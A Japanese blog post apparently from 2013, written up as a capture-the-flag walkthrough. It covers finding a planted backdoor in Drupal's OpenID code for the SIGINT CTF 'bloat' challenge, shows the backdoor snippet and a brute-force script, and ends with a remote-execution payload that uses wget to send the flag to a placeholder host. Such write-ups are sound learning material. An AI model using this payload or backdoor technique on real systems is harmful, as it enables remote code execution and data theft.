<!doctype html><html lang=en-us><head><meta charset=utf-8><link crossorigin=anonymous media=all rel=stylesheet href=https://blog.tyage.net/css/frameworks.css><link crossorigin=anonymous media=all rel=stylesheet href=https://blog.tyage.net/css/github.css><meta name=viewport content="width=device-width"><meta name=description content="CTF えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。
 Codegate YUT Preliminary 2013 Nuit du Hack CTF Quals 2013 BaltCTF Quals 2013 SECUINSIDE CTF Quals 2013 Boston Key Party CTF 2013 DEF CON CTF Qualifier 2013 SIGINT CTF 2013  はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。
今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://blog.tyage.net/p689/><meta name=twitter:card content="summary"><meta name=twitter:title content="SIGINT CTF 2013 writeup – bloat (cloud 200) - blog.tyage.net"><meta name=twitter:description content="CTF えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。
 Codegate YUT Preliminary 2013 Nuit du Hack CTF Quals 2013 BaltCTF Quals 2013 SECUINSIDE CTF Quals 2013 Boston Key Party CTF 2013 DEF CON CTF Qualifier 2013 SIGINT CTF 2013  はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。
今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。"><meta name=twitter:site content="https://blog.tyage.net/"><meta name=twitter:creator content="tyage"><meta name=twitter:image content="https://blog.tyage.net/"><meta property="og:type" content="article"><meta property="og:title" content="SIGINT CTF 2013 writeup – bloat (cloud 200) - blog.tyage.net"><meta property="og:description" content="CTF えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。
 Codegate YUT Preliminary 2013 Nuit du Hack CTF Quals 2013 BaltCTF Quals 2013 SECUINSIDE CTF Quals 2013 Boston Key Party CTF 2013 DEF CON CTF Qualifier 2013 SIGINT CTF 2013  はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。
今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。"><meta property="og:url" content="https://blog.tyage.net/p689/"><meta property="og:site_name" content="SIGINT CTF 2013 writeup – bloat (cloud 200)"><meta property="og:image" content="https://blog.tyage.net/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2013-07-16 20:23:45 +0000 UTC"><title>SIGINT CTF 2013 writeup – bloat (cloud 200) - blog.tyage.net</title><link rel=icon type=image/x-icon class=js-site-favicon href=https://blog.tyage.net/images/favicon.ico><meta name=theme-color content="#1e2327"><script>const match=location.search.match(/^\?p=(\d+)$/)
if(location.pathname==='/'&&match!==null){const postId=match[1]
history.replaceState({previousUrl:location.href},'',`/p${postId}/`)
location.reload()}else{if(history.state!==null&&history.state.previousUrl){history.replaceState({},'',history.state.previousUrl)}}</script><style>.blog-post p{line-height:1.8}</style><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-3879973-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class="env-production emoji-size-boost page-responsive page-profile"><div class="position-relative js-header-wrapper"><span class="Progress progress-pjax-loader position-fixed width-full js-pjax-loader-bar"><span class="progress-pjax-loader-bar top-0 left-0" style=width:0%></span></span><header class="Header py-lg-0 js-details-container Details flex-wrap flex-lg-nowrap p-responsive" role=banner><div class="Header-item d-none d-lg-flex"><a class=Header-link href=https://blog.tyage.net/ aria-label=Homepage data-ga-click="Header, go to dashboard, icon:logo"><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z" /></svg></a></div><div class="Header-item Header-item--full flex-column flex-lg-row width-full flex-order-2 flex-lg-order-none mr-0 mr-lg-3 mt-3 mt-lg-0 Details-content--hidden"><div class="header-search flex-self-stretch flex-lg-self-auto mr-0 mr-lg-3 mb-3 mb-lg-0 scoped-search site-scoped-search js-site-search position-relative js-jump-to" role=combobox aria-owns=jump-to-results aria-label="Search or jump to" aria-haspopup=listbox aria-expanded=false><div class=position-relative></div></div></div><nav class=d-flex aria-label=Global><a class="js-selected-navigation-item Header-link py-lg-3">&nbsp;</a></nav><div class="Header-item Header-item--full flex-justify-center d-lg-none position-relative" style=margin-right:auto><a class=Header-link href=https://blog.tyage.net/ aria-label=Homepage data-ga-click="Header, go to dashboard, icon:logo"><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z" /></svg></a></div><div class="Header-item position-relative mr-0 d-none d-lg-flex"><details class="details-overlay details-reset"><summary class=Header-link aria-label="View profile and more" data-ga-click="Header, show menu, icon:avatar"><img alt class=avatar src=/icon/icon.jpg height=20 width=20></summary></details></div></header></div><div id=start-of-content class=show-on-focus></div><div id=js-flash-container></div><div class=application-main data-commit-hovercards-enabled><div itemscope itemtype=http://schema.org/SoftwareSourceCode><main><div class="pagehead repohead instapaper_ignore readability-menu experiment-repo-nav pt-0 pt-lg-4"><div class="repohead-details-container clearfix container-lg p-responsive d-none d-lg-block"><div class="mb-3 d-flex"><h1 class="public css-truncate float-none flex-auto width-fit pl-0"><a class="avatar mr-1" href=https://blog.tyage.net/about/><img src=/icon/icon.jpg width=26 height=26></a>
<span class=author><a href=https://blog.tyage.net/>tyage</a></span>
<span class=path-divider>/</span>
<strong itemprop=name class=css-truncate-target style=max-width:410px><a href=https://blog.tyage.net/p689/>SIGINT CTF 2013 writeup – bloat (cloud 200)</a></strong><div class="d-block text-small text-gray">Created <time-ago datetime=2013-07-16 class=no-wrap title="Created at 2013/07/16">2013-07-16</time-ago>
<span class=file-info-divider></span>Modified <time-ago datetime=2013-07-16 class=no-wrap title="Modified  at 2013/07/16">2013-07-16</time-ago></div></h1></div></div></div><div class="container-lg clearfix new-discussion-timeline experiment-repo-nav p-responsive"><div class=repository-content><div class="Box mt-3 position-relative"><div class="Box-header py-2 d-flex flex-column flex-shrink-0 flex-md-row flex-md-items-center"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">1233 Words</div></div><div id=readme class="Box-body readme blob instapaper_body js-code-block-container"><article class="markdown-body entry-content p-3 p-md-6" itemprop=text><h3>CTF</h3><p>えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。</p><ul><li>Codegate YUT Preliminary 2013</li><li>Nuit du Hack CTF Quals 2013</li><li>BaltCTF Quals 2013</li><li>SECUINSIDE CTF Quals 2013</li><li>Boston Key Party CTF 2013</li><li>DEF CON CTF Qualifier 2013</li><li>SIGINT CTF 2013</li></ul><p>はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。</p><p>今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。</p><p></p><hr><h3>bloat</h3><p><a href=https://ctf.sigint.ccc.de/challenges/24/>SIGINT CTF 2013 – bloat (cloud 200)</a></p><p>この問題は、PHPで作られたWebアプリケーションにバックドアが仕掛けられているので、それを発見しろという問題です。</p><p>ソースコードが配られているのでそれを見てバックドアを探します。</p><p>配布されたソースコードはDrupalを使用したものでした。</p><p>ということなので、早速diffをとってみるのですが、様々な場所の変数名が変更されており、またインデントや改行もめっちゃくちゃにされていたため、diffをとると何万行ものダミー変更部に悩まされることになり、バックドアの発見は難しくなっていました。</p><p>そこで、PHPの構文を解析して圧縮してくれる<a href=https://code.google.com/p/php-compressor/>php-compressor</a>を使用し、ファイルを圧縮した上でdiffをとってみました。<br>（実際には今回の問題用に圧縮後の変数名の命名方法を変更するなどしています。）</p><p>すると、何千行か関係のないdiffもあったのですが、openID関連のファイルにバックドアらしき変更がされているのが見つかりました。</p><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>10
</pre></td><td class=code><pre class=php style=font-family:monospace><span style=color:#900>define</span><span style=color:#090>&#40;</span><span style=color:#00f>'OPENID_DH_DEFAULT_GEN'</span><span style=color:#393>,</span> <span style=color:#00f>'86'</span><span style=color:#090>&#41;</span><span style=color:#393>;</span></pre></td></tr></table></div><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>211
212
213
214
215
216
217
218
219
220
</pre></td><td class=code><pre class=php style=font-family:monospace>      <span style=color:#008>$discovery</span> <span style=color:#393>=</span> openid_discovery<span style=color:#090>&#40;</span><span style=color:#008>$imaginably</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
      <span style=color:#b1b100>if</span><span style=color:#090>&#40;</span><span style=color:#900>strpos</span><span style=color:#090>&#40;</span><span style=color:#008>$imaginably</span><span style=color:#393>,</span> <span style=color:#00f>'@'</span><span style=color:#090>&#41;</span><span style=color:#090>&#41;</span>
  <span style=color:#090>&#123;</span>
   <span style=color:#900>list</span><span style=color:#090>&#40;</span><span style=color:#008>$user</span><span style=color:#393>,</span> <span style=color:#008>$host</span><span style=color:#090>&#41;</span> <span style=color:#393>=</span> <span style=color:#900>explode</span><span style=color:#090>&#40;</span><span style=color:#00f>'@'</span><span style=color:#393>,</span> <span style=color:#008>$imaginably</span><span style=color:#393>,</span> <span style=color:#c6c>2</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
<span style=color:#090>&#125;</span>
<span style=color:#b1b100>else</span>
    <span style=color:#090>&#123;</span>
     <span style=color:#008>$user</span> <span style=color:#393>=</span> <span style=color:#090;font-weight:700>false</span><span style=color:#393>;</span>
     <span style=color:#008>$host</span> <span style=color:#393>=</span> <span style=color:#090;font-weight:700>false</span><span style=color:#393>;</span>
     <span style=color:#090>&#125;</span></pre></td></tr></table></div><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>247
248
</pre></td><td class=code><pre class=php style=font-family:monospace><span style=color:#008>$user_enc</span> <span style=color:#393>=</span> _openid_dh_long_to_base64<span style=color:#090>&#40;</span><span style=color:#008>$user</span> <span style=color:#393>*</span> OPENID_DH_DEFAULT_GEN<span style=color:#090>&#41;</span><span style=color:#393>;</span>
    <span style=color:#008>$service</span><span style=color:#090>&#91;</span><span style=color:#00f>'uri'</span><span style=color:#090>&#93;</span> <span style=color:#393>=</span> drupal_map_assoc<span style=color:#090>&#40;</span><span style=color:#900>array</span><span style=color:#090>&#40;</span><span style=color:#008>$host</span><span style=color:#090>&#41;</span><span style=color:#393>,</span> <span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#393>;</span></pre></td></tr></table></div><p>drupal_map_assocをみてみると、array_mapを使用しているため、$user_encが関数名となればその関数を実行できるようだとわかりました。</p><p>そこで、実行できる関数を探すため、以下のscriptを走らせたところ、execとfile関数が実行可能であると判明しました。</p><div class=wp_syntax style=position:relative><table><tr><td class=code><pre class=php style=font-family:monospace><span style=color:#b1b100>for</span> <span style=color:#090>&#40;</span><span style=color:#008>$i</span><span style=color:#393>=</span><span style=color:#c6c>0</span><span style=color:#393>;</span><span style=color:#008>$i</span><span style=color:#393>&lt;</span><span style=color:#c6c>100000</span><span style=color:#393>;++</span><span style=color:#008>$i</span><span style=color:#090>&#41;</span> <span style=color:#090>&#123;</span>
  <span style=color:#008>$user_enc</span> <span style=color:#393>=</span> _openid_dh_long_to_base64<span style=color:#090>&#40;</span><span style=color:#008>$i</span> <span style=color:#393>*</span> <span style=color:#c6c>86</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
  <span style=color:#b1b100>if</span> <span style=color:#090>&#40;</span><span style=color:#900>is_callable</span><span style=color:#090>&#40;</span><span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#090>&#41;</span> <span style=color:#090>&#123;</span>
    <span style=color:#900>var_dump</span><span style=color:#090>&#40;</span><span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
    <span style=color:#900>var_dump</span><span style=color:#090>&#40;</span><span style=color:#008>$i</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
  <span style=color:#090>&#125;</span>
<span style=color:#090>&#125;</span></pre></td></tr></table></div><p>=> 結果：</p><pre>
string(4) "exec"
int(93802)
string(4) "file"
int(96141)
</pre><p>ここまでくれば、あとはexec関数を実行するだけです。</p><p>しかし、関数の実行結果はレスポンスで帰ってこないため、wgetを使用して、結果を見れるようにしました。</p><p>色々したところ、/flagにflagがあることが判明したので、以下の文字列をopenIDに入力して送信し、flagを獲得しました。</p><pre>
93802@cat /flag | awk '{print "http://xxxxx/xxx?key=" $0;}' | xargs wget
</pre><h3>オチ</h3><p>最終的に解けたのはいいのですが、実はコンテストの開催期間を勘違いしており、問題をちゃんと解き始めた時点でコンテストが終わっていたのでした・・・</p><p>結局、ポイント的に今回はチームに貢献することができませんでしたorz</p><p>この問題のポイントを獲得したのは1チームだけだったようです。<br>参考にそのチームの方のwrite upを載せておきます。</p><p><a href=https://cesena.ing2.unibo.it/2013/07/07/sigint-2013-cloud200-bloat/>SIGINT 2013 – [cloud200] bloat</a></p><p>個人的には最後にncコマンドを使用したところは非常に参考になりました。<br>なんで思いつかなかったんだろう。。。</p></article></div></div></div></div></main></div></div><div class="footer container-lg width-full p-responsive" role=contentinfo><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0"></a></li></ul><a aria-label=Homepage title=blog.tyage.net class="footer-octicon d-none d-lg-block mx-lg-4" href=https://blog.tyage.net/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div><script crossorigin=anonymous type=application/javascript src=https://blog.tyage.net/js/frameworks.js></script><script crossorigin=anonymous type=application/javascript src=https://blog.tyage.net/js/github-bootstrap.js></script><script src=https://blog.tyage.net/js/stop.js></script><script src=https://blog.tyage.net/js/contributions.js></script></body></html>